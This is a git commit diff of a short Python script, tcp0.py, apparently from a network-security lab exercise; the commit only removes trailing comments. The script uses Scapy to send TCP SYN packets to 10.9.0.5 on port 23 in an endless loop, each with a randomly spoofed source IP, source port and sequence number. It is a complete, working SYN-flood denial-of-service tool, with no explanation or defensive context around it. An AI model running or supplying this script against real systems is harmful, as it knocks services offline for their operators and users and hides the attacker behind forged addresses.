7add59266161bfea9d9062fe288967bee28b374f
ayhamibdah <ayhamibdah333@gmail.com>
2025-05-15 21:51:49 +0300

    Update tcp0.py

--- tcp0.py
+++ tcp0.py
@@ -7,7 +7,7 @@ ip = IP(dst="10.9.0.5")
 tcp = TCP(dport=23, flags="S")
 pkt = ip/tcp
 while True:
-  pkt [IP].src = str(IPv4Address (getrandbits (32))) #
-  pkt [TCP].sport = getrandbits (16) # source port
-  pkt [TCP].seq = getrandbits (32) # sequence
+  pkt [IP].src = str(IPv4Address (getrandbits (32))) 
+  pkt [TCP].sport = getrandbits (16) 
+  pkt [TCP].seq = getrandbits (32) 
   send (pkt, verbose=0)
